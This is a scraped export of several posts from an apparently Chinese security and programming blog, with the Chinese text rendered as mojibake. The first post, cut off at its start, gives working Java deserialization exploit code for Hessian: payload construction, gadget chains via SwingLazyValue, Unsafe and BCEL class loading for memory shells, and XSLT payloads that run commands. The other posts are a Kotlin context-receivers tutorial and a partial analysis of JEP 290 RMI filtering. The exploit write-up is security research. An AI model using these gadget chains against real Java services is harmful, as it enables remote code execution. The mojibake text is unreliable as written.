æ¥è·å–ç±»åå­—ç¬¦ä¸²\nå¾ˆå®¹æ˜“æƒ³åˆ°ï¼Œæˆ‘ä»¬åœ¨åºåˆ—åŒ–æ•°æ®ä¸­ï¼Œå°†å¼€å¤´ä»£è¡¨è‡ªå®šä¹‰ç±»å‹çš„æ ‡å¿— C å¤šå†™å…¥ä¸€ä¸ªï¼Œé‚£ä¹ˆåœ¨ readString æ–¹æ³•ä¸­è¯»å–åˆ°çš„ä»ç„¶æ˜¯å®Œæ•´çš„ MimeTypeParameterList å¯¹è±¡ï¼Œè¿™æ—¶å€™å°±ä¼šå› ä¸º tag ä¸æ˜¯ä»£è¡¨å­—ç¬¦ä¸²è€Œè¿›å…¥ expect æ–¹æ³•ï¼Œå°† MimeTypeParameterList ååºåˆ—åŒ–ï¼Œå¹¶è§¦å‘å®ƒçš„ toString æ–¹æ³•\nByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); Hessian2Output out = new Hessian2Output(byteArrayOutputStream); out.getSerializerFactory().setAllowNonSerializable(true); out.writeObject(object); out.flushBuffer(); byte[] origin = byteArrayOutputStream.toByteArray(); byte[] payload = new byte[origin.length + 1]; System.arraycopy(new byte[]{'C'}, 0, payload, 0, 1); System.arraycopy(origin, 0, payload, 1, origin.length); Code Snippet 7: åœ¨åºåˆ—åŒ–æ•°æ®å¼€å¤´æ·»åŠ  C (byte) exec:347, Runtime (java.lang) ... invoke:275, MethodUtil (sun.reflect.misc) ... invoke:497, Method (java.lang.reflect) [1] createValue:73, SwingLazyValue (sun.swing) getFromHashtable:216, UIDefaults (javax.swing) get:161, UIDefaults (javax.swing) toString:253, MimeTypeParameterList (javax.activation) valueOf:2994, String (java.lang) append:131, StringBuilder (java.lang) expect:2880, Hessian2Input (com.caucho.hessian.io) readString:1398, Hessian2Input (com.caucho.hessian.io) readObjectDefinition:2180, Hessian2Input (com.caucho.hessian.io) readObject:2122, Hessian2Input (com.caucho.hessian.io) Code Snippet 2: è°ƒç”¨æ ˆ ä¸å‡ºç½‘åˆ©ç”¨ é€šè¿‡åå°„è°ƒç”¨ä»»æ„æ–¹æ³•å¯ä»¥åšåˆ° RCEï¼Œä½†åœ¨æ— æ³•å‡ºç½‘çš„æƒ…å¢ƒä¸‹ï¼Œå•çº¯çš„ RCE ä¹Ÿéš¾ä»¥æœ‰æ•ˆåˆ©ç”¨ã€‚å¦‚æœå¯ä»¥å€ŸåŠ© SwingLazyValue#createValue åˆå§‹åŒ–ä»»æ„ç±»ï¼Œé‚£ä¹ˆå°±å¯ä»¥å†™å…¥å†…å­˜é©¬\nUnsafe sun.misc.Unsafe#defineClass å¯ä»¥é€šè¿‡å­—èŠ‚æ•°ç»„åŠ¨æ€å®šä¹‰ä¸€ä¸ªç±»ï¼Œ SwingLazyValue#createValue åˆå¯ä»¥åˆ©ç”¨æ¥åŠ è½½å’Œåˆå§‹åŒ–ä¸€ä¸ªç±»ï¼Œç»“åˆä¸¤è€…æˆ‘ä»¬å°±èƒ½å¤Ÿå®ç°ä»»æ„ç±»åˆå§‹åŒ–ï¼Œä»¥æ­¤æ‰§è¡Œä»»æ„ä»£ç \næ•´ä¸ªåˆ©ç”¨è¿‡ç¨‹éœ€è¦è§¦å‘ä¸¤æ¬¡ååºåˆ—åŒ–æ¼æ´ï¼Œç¬¬ä¸€æ¬¡é€šè¿‡åå°„è°ƒç”¨ defineClass å®šä¹‰ä»»æ„ç±»ï¼Œå‡è®¾ä¸º Exploit\nMethod invoke = MethodUtil.class.getMethod(\u0026quot;invoke\u0026quot;, Method.class, Object.class, Object[].class); Method defineClass = Unsafe.class.getDeclaredMethod(\u0026quot;defineClass\u0026quot;, String.class, byte[].class, int.class, int.class, ClassLoader.class, ProtectionDomain.class); Field f = Unsafe.class.getDeclaredField(\u0026quot;theUnsafe\u0026quot;); f.setAccessible(true); Object unsafe = f.get(null); Object[] args = new Object[]{invoke, new Object(), new Object[]{defineClass, unsafe, new Object[]{\u0026quot;exp\u0026quot;, payload, 0, payload.length, null, null}}}; // payload ä¸º Exploit ç±»å­—èŠ‚æ•°ç»„ SwingLazyValue swingLazyValue = new SwingLazyValue(\u0026quot;sun.reflect.misc.MethodUtil\u0026quot;, \u0026quot;invoke\u0026quot;, args); æˆåŠŸå®šä¹‰ Exploit ç±»ååŠ è½½å¹¶åˆå§‹åŒ–ï¼Œéœ€è¦å°† methodName è®¾ç½®ä¸º null\nSwingLazyValue swingLazyValue = new SwingLazyValue(\u0026quot;Exploit\u0026quot;, null, new Object[0]); BCEL BCELï¼ˆByte Code Engineering Libraryï¼‰æ˜¯ä¸€ä¸ªç”± Apache Commons æä¾›çš„åº“ï¼Œç”¨äºåˆ†æã€åˆ›å»ºå’Œä¿®æ”¹ Java å­—èŠ‚ç ï¼Œè€Œ com.sun.org.apache.bcel.internal.util.JavaWrapper#_main å¯ä»¥ä» BCEL æ ¼å¼çš„å¯¹è±¡å­—ç¬¦ä¸²ä¸­åŠ¨æ€æ„å»ºå¯¹è±¡\nSwingLazyValue slz = new SwingLazyValue(\u0026quot;com.sun.org.apache.bcel.internal.util.JavaWrapper\u0026quot;, \u0026quot;_main\u0026quot;, new Object[]{new String[]{payload}}); // payload æ˜¯æ¶æ„ç±»çš„ BCEL å­—ç¬¦ä¸² è°ƒç”¨æ ˆ _main:153, JavaWrapper (com.sun.org.apache.bcel.internal.util) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:497, Method (java.lang.reflect) createValue:73, SwingLazyValue (sun.swing) getFromHashtable:216, UIDefaults (javax.swing) get:161, UIDefaults (javax.swing) toString:253, MimeTypeParameterList (javax.activation) valueOf:2994, String (java.lang) append:131, StringBuilder (java.lang) expect:2880, Hessian2Input (com.caucho.hessian.io) readString:1398, Hessian2Input (com.caucho.hessian.io) readObjectDefinition:2180, Hessian2Input (com.caucho.hessian.io) readObject:2122, Hessian2Input (com.caucho.hessian.io) XSLT XSLT æ˜¯ä¸€ç§æ ·å¼è½¬æ¢æ ‡è®°è¯­è¨€ï¼Œå¯ä»¥å°† XML æ–‡æ¡£è½¬æ¢æˆå…¶ä»–æ ¼å¼ï¼Œæ¯”å¦‚ HTMLã€‚XSLT åŒ…å«äº†è¶…è¿‡ 100 ä¸ªå†…ç½®å‡½æ•°, è¿™äº›å‡½æ•°å¯ä»¥ç”¨äºå­—ç¬¦ä¸²ã€æ•°å€¼ã€æ—¥æœŸå’Œæ—¶é—´æ¯”è¾ƒã€èŠ‚ç‚¹å’Œ QName å¤„ç†, åºåˆ—å¤„ç†, é€»è¾‘åˆ¤æ–­ç­‰ç­‰\næˆ‘ä»¬å¯ä»¥å°† XSLT æƒ³è±¡æˆæ¨¡æ¿å¼•æ“ï¼Œåœ¨åˆ©ç”¨ SSTI æ—¶æˆ‘ä»¬é€šå¸¸éœ€è¦ç”¨æ¨¡æ¿è¯­è¨€å®šä¹‰å¤šä¸ªä¸­é—´å˜é‡å»æ„é€ å®Œæ•´çš„ payloadï¼ŒXSLT ä¹Ÿæä¾›äº†å®šä¹‰å˜é‡çš„å…ƒç´  variable\n\u0026lt;xsl:variable name=\u0026quot;name\u0026quot; select=\u0026quot;expression\u0026quot;\u0026gt; \u0026lt;!-- Content:template --\u0026gt; \u0026lt;/xsl:variable\u0026gt; å…¶ä¸­ select å±æ€§æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œå¯ä»¥çµæ´»åœ°é€šè¿‡å„ç§åŠŸèƒ½å‡½æ•°å»è·å–å˜é‡çš„å€¼ï¼Œå¦‚æœæ²¡æœ‰æ§åˆ¶å¥½è¾¹ç•Œï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ select å±æ€§ç›´æ¥è°ƒç”¨åº•å±‚è¯­è¨€çš„æ–¹æ³•/å‡½æ•°ã€‚æ¯”å¦‚ï¼š\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;utf-8\u0026quot;?\u0026gt; \u0026lt;xsl:stylesheet version=\u0026quot;1.0\u0026quot; xmlns:xsl=\u0026quot;http://www.w3.org/1999/XSL/Transform\u0026quot; xmlns:rt=\u0026quot;http://xml.apache.org/xalan/java/java.lang.Runtime\u0026quot; xmlns:ob=\u0026quot;http://xml.apache.org/xalan/java/java.lang.Object\u0026quot;\u0026gt; \u0026lt;xsl:template match=\u0026quot;/\u0026quot;\u0026gt; \u0026lt;xsl:variable name=\u0026quot;rtobject\u0026quot; select=\u0026quot;rt:getRuntime()\u0026quot;/\u0026gt; \u0026lt;xsl:variable name=\u0026quot;process\u0026quot; select=\u0026quot;rt:exec($rtobject,'ls')\u0026quot;/\u0026gt; \u0026lt;xsl:variable name=\u0026quot;processString\u0026quot; select=\u0026quot;ob:toString($process)\u0026quot;/\u0026gt; \u0026lt;xsl:value-of select=\u0026quot;$processString\u0026quot;/\u0026gt; \u0026lt;/xsl:template\u0026gt; \u0026lt;/xsl:stylesheet\u0026gt; Code Snippet 8: CVE-2024-36522 åœ¨è¿›è¡Œååºåˆ—åŒ–é»‘åå•ç»•è¿‡æ—¶ï¼ˆæ¯”å¦‚ NacOSï¼‰ï¼Œä¹Ÿå¸¸å¸¸é€šè¿‡ XSLT ç»•è¿‡é»‘åå•å®ç°ä»»æ„ç±»åŠ è½½ï¼ˆå› ä¸ºç‰¹å¾åœ¨å­—ç¬¦ä¸²ä¸­ï¼Œå¯ä»¥æ­é…å„ç§ç¼–ç æ··æ·†ï¼‰ï¼Œä»è€Œå†™å…¥å†…å­˜é©¬\n\u0026lt;xsl:stylesheet version=\u0026quot;1.0\u0026quot; xmlns:xsl=\u0026quot;http://www.w3.org/1999/XSL/Transform\u0026quot; xmlns:b64=\u0026quot;http://xml.apache.org/xalan/java/sun.misc.BASE64Decoder\u0026quot; xmlns:ob=\u0026quot;http://xml.apache.org/xalan/java/java.lang.Object\u0026quot; xmlns:th=\u0026quot;http://xml.apache.org/xalan/java/java.lang.Thread\u0026quot; xmlns:ru=\u0026quot;http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils\u0026quot;\u0026gt; \u0026lt;xsl:template match=\u0026quot;/\u0026quot;\u0026gt; \u0026lt;xsl:variable name=\u0026quot;bs\u0026quot; select=\u0026quot;b64:decodeBuffer(b64:new(),'\u0026lt;class_bytes_b64\u0026gt;')\u0026quot;/\u0026gt; \u0026lt;xsl:variable name=\u0026quot;cl\u0026quot; select=\u0026quot;th:getContextClassLoader(th:currentThread())\u0026quot;/\u0026gt; \u0026lt;xsl:variable name=\u0026quot;rce\u0026quot; select=\u0026quot;ru:defineClass('\u0026lt;class_name\u0026gt;',$bs,$cl)\u0026quot;/\u0026gt; \u0026lt;xsl:value-of select=\u0026quot;$rce\u0026quot;/\u0026gt; \u0026lt;/xsl:template\u0026gt; \u0026lt;/xsl:stylesheet\u0026gt; ç»“åˆ SwingLazyValue#createValue çš„åå°„è°ƒç”¨åˆ©ç”¨ç‚¹ï¼Œå¯ä»¥ä½¿ç”¨ com.sun.org.apache.xalan.internal.xslt.Process#_main åŠ è½½æ‰§è¡Œæ¶æ„ XSLT ä»£ç ï¼Œä½†æ˜¯éœ€è¦é€šè¿‡æ–‡ä»¶è·¯å¾„æ¥åŠ è½½ï¼Œæ‰€ä»¥éœ€è¦å…ˆå†™åˆ°æ–‡ä»¶ä¸­\nå°†æ¶æ„ XSLT ä»£ç å†™å…¥æ–‡ä»¶ String evilXslt = \u0026quot;\u0026lt;æ¶æ„XSLTä»£ç ï¼Œæ¯”å¦‚ä¸Šæ–‡çš„å‘½ä»¤æ‰§è¡Œ\u0026gt;\u0026quot;; SwingLazyValue value1 = new SwingLazyValue(\u0026quot;com.sun.org.apache.xml.internal.security.utils.JavaUtils\u0026quot;, \u0026quot;writeBytesToFilename\u0026quot;, new Object[]{\u0026quot;/tmp/xslt_data\u0026quot;, evilXslt.getBytes()}); åŠ è½½è§£æ XSLTï¼Œè§¦å‘å‘½ä»¤æ‰§è¡Œ SwingLazyValue value2 = new SwingLazyValue(\u0026quot;com.sun.org.apache.xalan.internal.xslt.Process\u0026quot;, \u0026quot;_main\u0026quot;, new Object[]{new String[]{\u0026quot;-XT\u0026quot;, \u0026quot;-XSL\u0026quot;, \u0026quot;file:///tmp/xslt_data\u0026quot;}}); References https://su18.org/post/hessian/ https://yzddmr6.com/posts/swinglazyvalue-in-webshell/ ","date":"2024-12-18","permalink":"https://zrquan.github.io/posts/hessian-deserialization/","tags":["java","deserialize","hessian"],"title":"Hessian Deserialization"},{"content":" Status: Experimental in 1.6.20-M1 Discussion: KEEP-259 ä»‹ç» Kotlin åœ¨ 1.6.20-M1 ç‰ˆæœ¬ä¸­æ·»åŠ äº†ä¸€ä¸ªå®éªŒæ€§çš„æ–°ç‰¹æ€§ context receiversï¼Œä»¥æ”¯æŒä¸Šä¸‹æ–‡ç›¸å…³çš„å£°æ˜ï¼ˆcontext-dependent declarationsï¼‰\nè¿™ä¸ªç‰¹æ€§æ˜¯ä¸ºäº†æ–¹ä¾¿åœ¨ Kotlin ä¸­é¢å‘ä¸Šä¸‹æ–‡ç¼–ç¨‹ï¼Œè€Œåœ¨æ­¤ä¹‹å‰ä¸»è¦é€šè¿‡æ‰©å±•å‡½æ•°å’Œä½œç”¨åŸŸå‡½æ•°å®ç°ã€‚å…³äºé¢å‘ä¸Šä¸‹æ–‡ç¼–ç¨‹å¯ä»¥çœ‹çœ‹è¿™ç¯‡æ–‡ç« \nå¼•å…¥ context receivers çš„ç›®çš„1ï¼š\nRemove all limitations of member extensions for writing contextual abstractions Support top-level (non-member) contextual functions and properties Support adding contextual function and properties to 3rd party context classes Support multiple contexts Make blocks of code with multiple receivers representable in Kotlin\u0026rsquo;s type system Separate the concepts of extension and dispatch receivers from the concept of context receivers Context receivers should not change the meaning of unqualified this expression Multiple contexts should not be ordered during resolution, resolution ambiguities shall be reported Design a scalable resolution algorithm with respect to the number of receivers Call resolution should not be exponential in the number of context receivers å¦å¤–éœ€è¦æ³¨æ„ï¼Œcontext receivers åœ¨ 1.6.20 ç‰ˆæœ¬ä¸­è¿˜æ˜¯å®éªŒæ€§çš„ï¼Œéœ€è¦æ˜¾å¼å¼€å¯ -Xcontext-receivers æ‰èƒ½ä½¿ç”¨ã€‚æ¯”å¦‚åœ¨ Gradle ä¸­ä½¿ç”¨ï¼š\ntasks.withType\u0026lt;KotlinCompile\u0026gt; { kotlinOptions.jvmTarget = \u0026quot;17\u0026quot; kotlinOptions.freeCompilerArgs += \u0026quot;-Xcontext-receivers\u0026quot; } ä½¿ç”¨åœºæ™¯ ä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬æ¥å®ç°ä¸€ä¸ªç®€å•çš„é“¶è¡Œäº¤æ˜“é€»è¾‘ï¼Œå…¶ä¸­å­˜æ¬¾å’Œå–æ¬¾å¿…é¡»æ˜¯äº‹åŠ¡æ€§çš„ï¼Œåœ¨å¤±è´¥æ—¶è¿›è¡Œå›æ»š\næˆ‘ä»¬åœ¨ AccountService#transfer ä¸­å¤„ç†äº¤æ˜“é€»è¾‘ï¼Œé€šè¿‡ Transaction è¿›è¡Œäº‹åŠ¡æ€§æ“ä½œï¼Œæ‰€ä»¥ transfer éœ€è¦ä¼ å…¥ä¸€ä¸ªäº‹åŠ¡å®ä¾‹ã€‚å¸¸è§„å®ç°ï¼š\nclass AccountService { fun transfer(tx: Transaction, vararg operations: () -\u0026gt; Unit) { tx.start() try { operations.forEach { it.invoke() } tx.commit() } catch (e: Exception) { tx.rollback() } } } ç„¶ååœ¨è°ƒç”¨æ—¶å°† Transaction å®ä¾‹å’Œ lambda ä½œä¸ºå‚æ•°ä¼ å…¥ï¼š\nval service = AccountService() val transaction = Transaction() val repo = AccountRepo() service.transfer( transaction, { repo.credit(account1, 10.5) }, { repo.debit(account2, 10.5) } ) ä¸Šé¢çš„å®ç°åœ¨ Java ä¸­å¾ˆå¸¸è§ï¼Œä½†æ˜¯åœ¨ Kotlin æˆ‘ä»¬å¯ä»¥ç”¨æ‰©å±•å‡½æ•°æ¥ä¼˜åŒ–ä¸€ä¸‹ï¼š\nclass AccountService { fun Transaction.transfer(vararg operations: () -\u0026gt; Unit) { start() try { operations.forEach { it.invoke() } commit() } catch (e: Exception) { rollback() } } } ç°åœ¨ transfer ä¸­çš„ this æŒ‡å‘äº† Transaction å®ä¾‹ï¼Œé‚£ä¹ˆå°±ä¸å†éœ€è¦é€šè¿‡å‚æ•°ä¼ å…¥äº†ï¼Œä¸è¿‡éœ€è¦åœ¨ AccountService å®ä¾‹çš„ä¸Šä¸‹æ–‡ä¸­ä½¿ç”¨ transferï¼Œæ¯”å¦‚ä½¿ç”¨ withï¼š\nwith(service) { transaction.transfer( { repo.credit(account1, 10.5) }, { repo.debit(account2, 10.5) } ) } ä½¿ç”¨æ‰©å±•å‡½æ•°è™½ç„¶å‡å°‘äº†ä¸€äº›ä»£ç ï¼Œä½†æ˜¯å­˜åœ¨å…¶ä»–é—®é¢˜ï¼šåœ¨è¯­ä¹‰ä¸Šå’ŒåŸæ¥çš„ç‰ˆæœ¬æ˜¯ä¸åŒçš„â€”â€”transfer æ˜¯ Transaction ç±»çš„æ–¹æ³•ï¼Œè¿™ä¸€ç‚¹ä¹Ÿä¸ç¬¦åˆå®é™…çš„é€»è¾‘ï¼ŒTransaction åº”è¯¥åªåŒ…å«äº‹åŠ¡æ€§çš„æ“ä½œ\né‚£ä¹ˆæœ‰æ²¡æœ‰åŠæ³•å°† Transaction ä¸Šä¸‹æ–‡å¼•å…¥ transfer çš„åŒæ—¶ï¼Œä¸æ”¹å˜ transfer çš„æ‰€å±ç±»å‘¢ï¼ŸContext receivers ç‰¹æ€§å°±å¯ä»¥å®ç°è¿™ä¸€ç‚¹\næˆ‘ä»¬åœ¨ transfer çš„å£°æ˜ä¸Šé€šè¿‡ context() æŒ‡å®šä¸Šä¸‹æ–‡ï¼Œé‚£ä¹ˆåœ¨å‡½æ•°å†…å°±ä¼šå¼•å…¥ä¸€ä¸ªæŒ‡å‘ Transaction çš„éšå¼çš„ this\nclass AccountService { context(Transaction) fun transfer(vararg operations: () -\u0026gt; Unit) { start() try { operations.forEach { it.invoke() } commit() } catch (e: Exception) { rollback() } } } ç„¶ååœ¨ Transaction å®ä¾‹çš„ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ transfer æœåŠ¡ï¼Œåœ¨è¯­ä¹‰ä¸Šä¹Ÿç¬¦åˆé€»è¾‘\nwith(transaction) { service.transfer( { repo.credit(account1, 10.5) }, { repo.debit(account2, 10.5) } ) } æ€è€ƒ ç”±äº context receivers è¿˜å¤„äºå®éªŒé˜¶æ®µï¼Œä½¿ç”¨ä½“éªŒå’Œå®é™…æ¡ˆä¾‹éƒ½è¿˜æ¯”è¾ƒæ¬ ç¼ºï¼Œè¦æ„Ÿå—åˆ°å®ƒå¸¦æ¥çš„å¥½å¤„ææ€•è¿˜éœ€è¦ä¸€æ®µæ—¶é—´ã€‚ä¸è¿‡åœ¨å®ç° DSL ä¸Šå®ƒè‚¯å®šæ¯”ç»§æ‰¿æ›´åŠ é€‚åˆï¼Œå”¯ä¸€éœ€è¦æ‹…å¿ƒçš„æ˜¯æ»¥ç”¨ context å¯¼è‡´ä»£ç æ™¦æ¶©éš¾æ‡‚\nå…³äº context receivers çš„è¯¦ç»†è¯´æ˜å»ºè®®çœ‹ KEEP ä¸Šçš„ç›¸å…³ææ¡ˆï¼šcontext-receivers\nhttps://github.com/Kotlin/KEEP/blob/master/proposals/context-receivers.md#goals\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2022-06-06","permalink":"https://zrquan.github.io/posts/context-receivers/","tags":["kotlin"],"title":"Context receivers"},{"content":"æœ¬æ–‡ä¸»è¦ä»‹ç»ä¸€ä¸‹ JEP 290 è¿™ä¸ªç‰¹æ€§ï¼Œåˆ†æå®ƒæ˜¯å¦‚ä½•ä¿æŠ¤ RMI å…å—ååºåˆ—åŒ–æ”»å‡»çš„ï¼Œä»¥åŠæœ‰å“ªäº›æ–¹æ³•å¯ä»¥ç»•è¿‡ JEP 290 å¯¹ RMI è¿›è¡Œååºåˆ—åŒ–æ”»å‡»ã€‚\nåœ¨ä¹‹å‰çš„æ–‡ç« ã€ŠJava RMIã€‹ä¸­ä»‹ç»äº† RMI æœºåˆ¶å¯èƒ½é­å—ååºåˆ—åŒ–æ¼æ´æ”»å‡»çš„å‡ ç§æƒ…å†µï¼Œä½†é‚£æ˜¯åœ¨æ²¡æœ‰ JEP 290 æœºåˆ¶çš„å‰æä¸‹è¿›è¡Œçš„ã€‚JEP 290 æ˜¯åœ¨ Java9 ä¸­æ–°å¢çš„å®‰å…¨ç‰¹æ€§ï¼Œä¸ºååºåˆ—åŒ–æµç¨‹æä¾›äº†æ£€éªŒå’Œè¿‡æ»¤æœºåˆ¶ï¼Œå¹¶ä¸”è¯¥ç‰¹æ€§å‘å‰ç§»æ¤åˆ°äº† JDK 6/7/8 ä¸­ã€‚\nJEP 290 ç®€ä»‹ JEP 290 çš„æ ¸å¿ƒè¿‡ç¨‹å°±æ˜¯åºåˆ—åŒ–å®¢æˆ·ç«¯é€šè¿‡å®ç° ObjectInputFilter æ¥å£æ¥åˆ›å»ºä¸€ä¸ªè¿‡æ»¤å™¨ï¼Œå¹¶è°ƒç”¨ setObjectInputFilter æ–¹æ³•å°†å®ƒè®¾ç½®åˆ° ObjectInputStream ä¸­ã€‚è¿™ä¸ªè¿‡æ»¤å™¨ä¼šåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­è¢«è°ƒç”¨ï¼Œå¯¹å³å°†ååºåˆ—åŒ–çš„ç±»è¿›è¡Œæ£€éªŒå’Œè¿‡æ»¤ï¼Œç„¶åè¿”å› ACCEPTEDã€REJECTED æˆ–è€… UNDECIDED è¿™å‡ ä¸ªçŠ¶æ€1ã€‚\nJEP 290 ä¸»è¦çš„ç‰¹ç‚¹å¦‚ä¸‹ï¼š\næä¾›çµæ´»çš„æœºåˆ¶ï¼Œè®©å¼€å‘è€…å¯ä»¥é€šè¿‡é»‘ç™½åå•é™åˆ¶è¦ååºåˆ—åŒ–çš„ç±»ï¼› ååºåˆ—åŒ–æ—¶å¯ä»¥è®¾ç½®æŒ‡æ ‡æ¥é™åˆ¶ååºåˆ—åŒ–çš„æ·±åº¦å’Œå¤æ‚åº¦ï¼› ä¸º RMI è¿œç¨‹å¯¹è±¡æä¾›ç±»éªŒè¯æœºåˆ¶ï¼› è¿‡æ»¤å™¨ä¸èƒ½ä¿®æ”¹æˆ–ç»§æ‰¿ ObjectInputStream çš„ç°å­˜å­ç±»ï¼› å®šä¹‰ä¸€ä¸ªå¯ä»¥é€šè¿‡ properties æˆ–è€…æ–‡ä»¶æ¥é…ç½®çš„å…¨å±€è¿‡æ»¤å™¨ã€‚ æ£€éªŒè¿‡ç¨‹åˆ†æ ä¹‹å‰çš„æ–‡ç« ä¸­æˆ‘ä»¬åˆ†æè¿‡ï¼Œæ³¨å†Œä¸­å¿ƒè°ƒç”¨ bind æ–¹æ³•æ³¨å†Œè¿œç¨‹å¯¹è±¡æ—¶ï¼Œä¼šå¯¹æœåŠ¡ç«¯ä¼ æ¥çš„å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–ï¼Œå¦‚æœè¿™æ˜¯ä¸€ä¸ªæ¶æ„å¯¹è±¡å°±å¯èƒ½å¯¼è‡´å‘½ä»¤æ‰§è¡Œã€‚é‚£ä¹ˆåœ¨ JEP 290 æœºåˆ¶çš„ä¿æŠ¤ä¸‹ç»“æœæ˜¯æ€æ ·å‘¢ï¼Ÿ\næˆ‘ä»¬ä½¿ç”¨ JDK 8u212 æµ‹è¯•ä¸€ä¸‹ï¼ŒServer ç«¯è¿”å›ä»¥ä¸‹é”™è¯¯ï¼š\nåœ¨ ObjectInputStream#filterCheck æ–¹æ³•ä¸­å¯¹ååºåˆ—åŒ–ç±»è¿›è¡Œäº†æ£€éªŒï¼Œè¿”å›çš„çŠ¶æ€æ˜¯ REJECTED å¯¼è‡´æŠ›å‡ºå¼‚å¸¸ã€‚ä» Registry çš„è¾“å‡ºå¯ä»¥çœ‹åˆ°è¢«è¿‡æ»¤çš„ç±»æ˜¯ AnnotationInvocationHandlerï¼š\næ ¹æ®é”™è¯¯ä¿¡æ¯ç»™å‡ºçš„è°ƒç”¨æ ˆï¼Œæˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹é‡è¦çš„æ–¹æ³•ã€‚é¦–å…ˆæ¥åˆ°æ³¨å†Œè¿œç¨‹å¯¹è±¡çš„é€»è¾‘ä»£ç ä¸­ï¼Œbind æ–¹æ³•å¯¹åº”çš„æ“ä½œç æ˜¯ 0ï¼Œè¿›å…¥ case 0 è¯­å¥å—ï¼Œå…ˆåååºåˆ—åŒ–è¿œç¨‹å¯¹è±¡çš„åç§°å’Œå®ç°äº† Remote æ¥å£çš„è¿œç¨‹å¯¹è±¡ï¼š\nè·Ÿè¿› readObject è¿‡ç¨‹ï¼Œè¿™æ—¶è¦ååºåˆ—åŒ–çš„æ˜¯æˆ‘ä»¬ä¼ è¿‡æ¥çš„æ¶æ„å¯¹è±¡ï¼Œæ‰€ä»¥è¿›å…¥åˆ° ObjectInputStream#readOrdinaryObject æ–¹æ³•ï¼Œå¹¶è°ƒç”¨ readClassDesc æ¥è·å–ç±»æè¿°ç¬¦ã€‚\næ ¹æ®æ˜¯å¦ä¸ºåŠ¨æ€ä»£ç†ç±»ä¼šè°ƒç”¨ä¸åŒçš„æ–¹æ³•è¿›è¡Œå¤„ç†ï¼Œè€Œæˆ‘ä»¬å‘é€çš„æ¶æ„å¯¹è±¡æ˜¯ä¸€ä¸ªåŠ¨æ€ä»£ç†ç±»ï¼Œå®ƒçš„ InvocationHandler å±æ€§æ˜¯è¢«è¿‡æ»¤æ‰çš„ AnnotationInvocationHandlerã€‚å› æ­¤è°ƒç”¨ readProxyDescï¼š\nåœ¨ readProxyDesc ä¸­ä¼šå¯¹ interfaces å±æ€§ä¸­çš„æ¥å£ä¾æ¬¡è¿›è¡Œæ£€éªŒï¼š\næ­¤æ—¶åŠ¨æ€ä»£ç†ç±»çš„æ¥å£åˆ—è¡¨åªæœ‰ä¸€ä¸ª Remote ç±»ï¼Œé€šè¿‡äº†æ£€éªŒã€‚ç„¶åå†è°ƒç”¨ä¸€æ¬¡ filterCheck æ¥æ£€éªŒä»£ç†ç±»æœ¬èº«ï¼š\ncom.sun.proxy.$Proxy æ˜¯ç”± Proxy#newProxyInstance æ–¹æ³•åœ¨è¿è¡Œæ—¶ç”Ÿæˆçš„å¯¹è±¡ï¼Œå¹¶æ²¡æœ‰å¯¹åº”çš„æºä»£ç ã€‚\nç„¶åå¢åŠ é€’å½’æ·±åº¦ depth å’Œå¼•ç”¨æ€»æ•° totalObjectRefsï¼Œé€’å½’è°ƒç”¨ readClassDesc æ–¹æ³•è·å–ç±»æè¿°ç¬¦ï¼š\nè¿™æ¬¡è¿›å…¥çš„æ˜¯ readNonProxyDesc æ–¹æ³•ï¼Œç»§ç»­è°ƒç”¨ filterCheck æ£€éªŒå½“å‰ç±»ï¼Œç„¶åé€’å½’æ‰§è¡Œï¼š\nè¿™é‡Œæ³¨æ„åŒºåˆ† java.lang.reflect.Proxy å’Œä¸Šé¢çš„ com.sun.proxy.$Proxy ï¼Œåè€…é€šè¿‡å‰è€…çš„ newProxyInstance æ–¹æ³•ç”Ÿæˆã€‚\nè·å–äº†æœ€å¤–å±‚çš„åŠ¨æ€ä»£ç†ç±»çš„æè¿°ç¬¦ä¹‹åï¼Œå›åˆ° ObjectInputStream#readOrdinaryObject æ–¹æ³•ä¸­ï¼Œç„¶åå¯¹å±æ€§å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–ã€‚è¿‡ç¨‹å’Œä¹‹å‰ç±»ä¼¼ï¼Œåœ¨ readNonProxyDesc æ–¹æ³•ä¸­è°ƒç”¨ filterCheck æ£€éªŒ AnnotationInvocationHandler ç±»ã€‚è¿™æ¬¡æˆ‘ä»¬è·Ÿè¿›åˆ†æä¸€ä¸‹ filterCheck æ–¹æ³•ï¼š\nå¯ä»¥çœ‹åˆ°è°ƒç”¨äº† serialFilter.checkInput æ¥è¿›è¡Œæ£€éªŒï¼Œä» RegistryImpl ç±»ä¸­æ‰¾åˆ°å®ç°æ£€éªŒé€»è¾‘çš„ registryFilter æ–¹æ³•ï¼š\nprivate static Status registryFilter(FilterInfo var0) { ... if (var0.depth() \u0026gt; 20L) { return Status.REJECTED; } else { Class var2 = var0.serialClass(); if (var2 != null) { if (!var2.isArray()) { return String.class != var2 \u0026amp;\u0026amp; !Number.class.isAssignableFrom(var2) \u0026amp;\u0026amp; !Remote.class.isAssignableFrom(var2) \u0026amp;\u0026amp; !Proxy.class.isAssignableFrom(var2) \u0026amp;\u0026amp; !UnicastRef.class.isAssignableFrom(var2) \u0026amp;\u0026amp; !RMIClientSocketFactory.class.isAssignableFrom(var2) \u0026amp;\u0026amp; !RMIServerSocketFactory.class.isAssignableFrom(var2) \u0026amp;\u0026amp; !ActivationID.class.isAssignableFrom(var2) \u0026amp;\u0026amp; !UID.class.isAssignableFrom(var2) ? Status.REJECTED : Status.ALLOWED; } else { return var0.arrayLength() \u0026gt;= 0L \u0026amp;\u0026amp; var0.arrayLength() \u0026gt; 1000000L ? Status.REJECTED : Status.UNDECIDED; } } else { return Status.UNDECIDED; } } } 